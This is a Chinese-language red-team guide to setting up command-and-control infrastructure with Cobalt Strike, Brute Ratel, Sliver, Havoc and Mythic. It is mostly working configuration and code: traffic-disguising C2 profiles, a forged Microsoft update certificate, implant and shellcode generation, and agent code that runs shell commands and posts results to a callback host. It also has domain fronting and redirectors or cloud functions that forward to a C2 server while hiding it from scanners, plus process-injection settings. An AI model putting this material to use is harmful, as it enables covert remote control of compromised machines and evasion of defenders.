# C2框架 (Command & Control)

## 商业/闭源C2

### Cobalt Strike

#### Profile定制
```
# 基础HTTP Profile配置
http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache/2.4.41 (Ubuntu)";
    header "Keep-Alive" "timeout=5, max=100";
    header "Connection" "Keep-Alive";
}

# GET请求配置
http-get {
    set uri "/api/v1/news /api/v1/updates /api/v1/status";
    set verb "GET";
    
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";
        header "DNT" "1";
        
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/json;charset=UTF-8";
        header "Cache-Control" "no-cache";
        
        output {
            base64;
            prepend '{"status":"ok","data":{';
            append '}}';
            print;
        }
    }
}

# POST请求配置
http-post {
    set uri "/api/v1/submit /api/v1/upload /api/v1/push";
    set verb "POST";
    
    client {
        header "Content-Type" "application/json;charset=UTF-8";
        header "Accept" "application/json, text/javascript, */*; q=0.01";
        
        id {
            base64url;
            parameter "id";
        }
        
        output {
            base64;
            prepend '{"action":"report","content":';
            append '}';
            print;
        }
    }
    
    server {
        header "Content-Type" "application/json;charset=UTF-8";
        
        output {
            base64;
            prepend '{"response":"success","result":';
            append '}';
            print;
        }
    }
}
```

#### 插件开发
```python
# 自定义监听器插件
from aggressor import *

# 注册新的监听器
def register_custom_listener():
    listener_info = {
        "name": "CustomHTTP",
        "profile": "custom.profile",
        "port": 443,
        "secure": True,
        "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    return listener_info

# 自定义命令
alias custom_shell {
    local('$handle $data');
    $handle = openf(">commands.txt");
    writeb($handle, $1);
    closef($handle);
    
    # 执行命令并获取结果
    $data = exec("cmd.exe /c type commands.txt");
    println($data);
}

# 注册菜单
popup attacks {
    menu "Custom Attacks" {
        item "Custom Shell Command" {
            $cmd = prompt_text("Enter command:");
            custom_shell($cmd);
        }
    }
}
```

### Brute Ratel

#### 基础配置
```bash
# 安装和配置
wget https://bruteratel.com/download/batsrv.tar.gz
tar -xzf batsrv.tar.gz
cd bruteratel

# 配置监听器
./batsrv --profile profiles/http.json

# HTTP Profile示例
{
  "listener": {
    "name": "HTTP-443",
    "type": "HTTP",
    "port": 443,
    "secure": true,
    "host": "cdn.cloudflare.com",
    "uri": ["/api/v2/updates", "/api/v2/sync", "/api/v2/push"],
    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "headers": {
      "X-Forwarded-For": "8.8.8.8",
      "X-Real-IP": "8.8.8.8",
      "Accept-Language": "en-US,en;q=0.9"
    }
  }
}
```

#### 高级功能
```c
// Badger开发 - 自定义模块
#include <windows.h>
#include <stdio.h>

// 自定义命令执行
void CustomCommand(char* command) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (CreateProcess(NULL, command, NULL, NULL, FALSE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// 注册命令
RegisterCommand("custom_exec", CustomCommand);
```

---

## 开源/现代C2

### Sliver

#### 环境搭建
```bash
# 安装Sliver
wget https://github.com/BishopFox/sliver/releases/download/v1.5.37/sliver-server_linux
cp sliver-server_linux /usr/local/bin/sliver-server
chmod +x /usr/local/bin/sliver-server

# 启动服务器
sliver-server

# 生成客户端证书
sliver-server operator --name admin --lhost 192.168.1.100 --lport 8888
```

#### 证书伪造
```bash
# 生成伪造证书
openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
  -subj "/C=US/ST=California/L=San Francisco/O=Microsoft Corporation/CN=update.microsoft.com" \
  -keyout microsoft.key -out microsoft.crt

# 转换为PFX格式
openssl pkcs12 -export -out microsoft.pfx -inkey microsoft.key -in microsoft.crt

# 在Sliver中使用
sliver > https --domain update.microsoft.com --cert microsoft.pfx --key microsoft.key
```

#### 流量混淆
```bash
# HTTP Profile配置
sliver > profiles new --http --mtls cdn.cloudflare.com --skip-symbols --format shellcode windows_shellcode

# 域名前置
sliver > generate --mtls cdn.cloudflare.com --skip-symbols --format exe implant.exe

# 流量特征修改
sliver > profiles new --http --poll-timeout 30 --poll-jitter 15 --user-agent "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
```

### Havoc

#### 配置详解
```yaml
# Havoc配置文件
Teamserver:
  Host: "0.0.0.0"
  Port: 40056
  Build: "/path/to/havoc/server"
  
  Operators:
    - Username: "admin"
      Password: "ComplexPassword123!"
      
  Listeners:
    - Name: "HTTP-443"
      Protocol: "HTTPS"
      HostBind: "0.0.0.0"
      PortBind: 443
      HostConn: "cdn.cloudflare.com"
      PortConn: 443
      Secure: true
      Uris: ["/api/v3/updates", "/api/v3/sync"]
      Headers:
        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        X-Forwarded-For: "8.8.8.8"
        
    - Name: "DNS-Tunnel"
      Protocol: "DNS"
      HostBind: "0.0.0.0"
      PortBind: 53
      DnsZone: "tunnel.example.com"
```

#### Payload生成
```bash
# 生成Windows EXE
./havoc client --profile profiles/windows.yaml --format exe --output payload.exe

# 生成Shellcode
./havoc client --profile profiles/windows.yaml --format shellcode --output payload.bin

# 生成DLL
./havoc client --profile profiles/windows.yaml --format dll --output payload.dll

# 生成服务EXE
./havoc client --profile profiles/windows.yaml --format service-exe --output service.exe
```

### Mythic

#### Agent开发
```python
# Mythic Agent模板
from mythic import *

class CustomAgent(AgentBase):
    def __init__(self):
        super().__init__()
        self.name = "custom_agent"
        self.version = "1.0"
        
    async def get_config(self):
        return {
            "callback_interval": 10,
            "callback_jitter": 0.3,
            "callback_port": 443,
            "callback_host": "https://cdn.cloudflare.com",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
    async def execute_command(self, command):
        # 命令执行逻辑
        if command["command"] == "shell":
            return await self.execute_shell(command["args"])
        elif command["command"] == "download":
            return await self.download_file(command["args"])
        elif command["command"] == "upload":
            return await self.upload_file(command["args"])
            
    async def execute_shell(self, args):
        import subprocess
        result = subprocess.run(args, capture_output=True, text=True)
        return {
            "status": "success",
            "stdout": result.stdout,
            "stderr": result.stderr
        }
```

#### 模块化开发
```python
# 通信模块
class CommunicationModule:
    def __init__(self, profile):
        self.profile = profile
        self.session = requests.Session()
        
    def send_callback(self, data):
        # 加密数据
        encrypted_data = self.encrypt(data)
        
        # 发送请求
        response = self.session.post(
            self.profile["callback_url"],
            data=encrypted_data,
            headers=self.profile["headers"]
        )
        
        return self.decrypt(response.content)
        
    def encrypt(self, data):
        # AES加密
        from Crypto.Cipher import AES
        cipher = AES.new(self.profile["key"], AES.MODE_CBC)
        return cipher.encrypt(pad(data, AES.block_size))
```

---

## C2隐蔽技术

### Domain Fronting (域前置)

#### Cloudflare配置
```bash
# 1. 注册Cloudflare账户
# 2. 添加自己的域名
# 3. 配置CDN
# 4. 设置Page Rules

# 测试域前置
curl -H "Host: your-domain.com" https://cdn.cloudflare.com/test
```

#### AWS CloudFront配置
```json
{
  "DistributionConfig": {
    "CallerReference": "redteam-c2",
    "Comment": "C2 distribution",
    "DefaultCacheBehavior": {
      "TargetOriginId": "c2-origin",
      "ViewerProtocolPolicy": "redirect-to-https",
      "AllowedMethods": ["GET", "HEAD", "OPTIONS", "PUT", "POST", "PATCH", "DELETE"],
      "ForwardedValues": {
        "QueryString": true,
        "Headers": ["Host", "Origin", "Referer"]
      }
    },
    "Origins": [{
      "Id": "c2-origin",
      "DomainName": "c2.yourdomain.com",
      "CustomOriginConfig": {
        "HTTPPort": 80,
        "HTTPSPort": 443,
        "OriginProtocolPolicy": "https-only"
      }
    }]
  }
}
```

### Redirectors (重定向器)

#### Nginx反向代理
```nginx
# nginx.conf
server {
    listen 80;
    server_name cdn.cloudflare.com;
    
    location /api/v1 {
        proxy_pass https://real-c2-server.com/api/v1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        # 过滤恶意请求
        if ($http_user_agent ~* "(curl|wget|python|scan)" ) {
            return 404;
        }
        
        # 限制请求大小
        client_max_body_size 10M;
        
        # 添加响应头
        add_header X-Frame-Options DENY;
        add_header X-Content-Type-Options nosniff;
    }
}
```

#### Apache反向代理
```apache
<VirtualHost *:80>
    ServerName cdn.cloudflare.com
    
    # 启用代理模块
    ProxyPreserveHost On
    ProxyPass /api/v1 https://real-c2-server.com/api/v1
    ProxyPassReverse /api/v1 https://real-c2-server.com/api/v1
    
    # 过滤规则
    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|scan) [NC]
    RewriteRule ^.*$ - [F,L]
    
    # 日志配置
    ErrorLog /var/log/apache2/c2_error.log
    CustomLog /var/log/apache2/c2_access.log combined
</VirtualHost>
```

### CDN隐藏与云函数转发

#### Cloudflare Workers
```javascript
// Cloudflare Worker脚本
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  
  // 验证User-Agent
  const userAgent = request.headers.get('User-Agent')
  if (!userAgent || userAgent.includes('bot') || userAgent.includes('scan')) {
    return new Response('Not Found', { status: 404 })
  }
  
  // 转发到真实的C2服务器
  const c2Url = 'https://real-c2-server.com' + url.pathname
  
  const modifiedRequest = new Request(c2Url, {
    method: request.method,
    headers: request.headers,
    body: request.body
  })
  
  const response = await fetch(modifiedRequest)
  
  // 修改响应头
  const modifiedResponse = new Response(response.body, response)
  modifiedResponse.headers.set('Server', 'cloudflare')
  modifiedResponse.headers.set('CF-Cache-Status', 'DYNAMIC')
  
  return modifiedResponse
}
```

#### AWS Lambda函数
```python
# Lambda函数代码
import json
import boto3
import requests

def lambda_handler(event, context):
    # 验证请求
    user_agent = event.get('headers', {}).get('User-Agent', '')
    if 'bot' in user_agent.lower() or 'scan' in user_agent.lower():
        return {
            'statusCode': 404,
            'body': 'Not Found'
        }
    
    # 构建目标URL
    target_url = 'https://real-c2-server.com' + event['path']
    
    # 转发请求
    response = requests.request(
        method=event['httpMethod'],
        url=target_url,
        headers=event['headers'],
        data=event.get('body')
    )
    
    # 返回响应
    return {
        'statusCode': response.status_code,
        'headers': dict(response.headers),
        'body': response.text
    }
```

### 流量特征修改

#### Malleable C2 Profile编写
```
# 高级Malleable C2 Profile
set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";

# 动态URI生成
set data_jitter "50";

# HTTP GET
http-get {
    set uri "/api/v1/updates /api/v1/news /api/v1/status /api/v1/sync";
    
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";
        header "Cache-Control" "no-cache";
        header "DNT" "1";
        
        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/json;charset=UTF-8";
        header "Server" "cloudflare";
        header "CF-RAY" "1234567890abcdef";
        header "Cache-Control" "no-store, no-cache, must-revalidate, post-check=0, pre-check=0";
        
        output {
            mask;
            base64url;
            prepend '{"status":"ok","version":"1.0.0","data":[';
            append '],"timestamp":' + timestamp + '}';
            print;
        }
    }
}

# HTTP POST
http-post {
    set uri "/api/v1/submit /api/v1/upload /api/v1/push /api/v1/report";
    set verb "POST";
    
    client {
        header "Content-Type" "application/json;charset=UTF-8";
        header "Accept" "application/json, text/javascript, */*; q=0.01";
        header "X-Requested-With" "XMLHttpRequest";
        header "Origin" "https://cdn.cloudflare.com";
        header "Referer" "https://cdn.cloudflare.com/dashboard";
        
        id {
            base64url;
            parameter "session_id";
        }
        
        output {
            mask;
            base64url;
            prepend '{"action":"analytics","payload":';
            append '}';
            print;
        }
    }
    
    server {
        header "Content-Type" "application/json;charset=UTF-8";
        header "Server" "cloudflare";
        header "Access-Control-Allow-Origin" "*";
        
        output {
            mask;
            base64url;
            prepend '{"response":"success","result":';
            append '}';
            print;
        }
    }
}

# 进程注入配置
process-inject {
    set allocator "VirtualAllocEx";
    set min_alloc "16384";
    set startrwx "true";
    set userwx   "false";
    
    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
        strrep "ReflectiveLoader" "";
    }
    
    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
        strrep "ReflectiveLoader" "";
    }
    
    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        SetThreadContext;
        CreateRemoteThread "ntdll!RtlUserThreadStart";
        RtlCreateUserThread;
    }
}
```

---

## 实战部署检查清单

### 部署前检查
- [ ] 域名已注册并配置DNS
- [ ] SSL证书已申请并配置
- [ ] CDN服务已配置
- [ ] 重定向器已部署
- [ ] Profile已测试

### 部署中检查
- [ ] C2服务器防火墙已配置
- [ ] 监听器已启动
- [ ] SSL/TLS已启用
- [ ] 域名前置已测试
- [ ] 流量混淆已验证

### 部署后检查
- [ ] 代理转发正常工作
- [ ] 流量特征已隐藏
- [ ] 日志清理已配置
- [ ] 应急响应已准备
- [ ] 备份方案已就绪